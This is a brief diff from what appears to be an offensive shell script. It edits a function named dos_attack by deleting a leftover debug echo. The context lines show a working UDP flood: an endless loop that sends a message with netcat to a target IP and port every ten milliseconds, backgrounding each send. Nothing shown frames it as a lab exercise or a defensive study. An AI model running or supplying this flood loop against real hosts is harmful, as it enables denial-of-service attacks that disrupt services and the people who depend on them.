@@ -307,7 +307,6 @@ dos_attack(){
 		echo "${BLUE}Starting attack...${NC}"
 		echo "To stop press Ctrl+C"
 		while true; do
-			echo GOlaaa
 			echo -n "$message" | nc -u "$ip" "$port_flood" -q 0 &
 			sleep 0.01
 		done
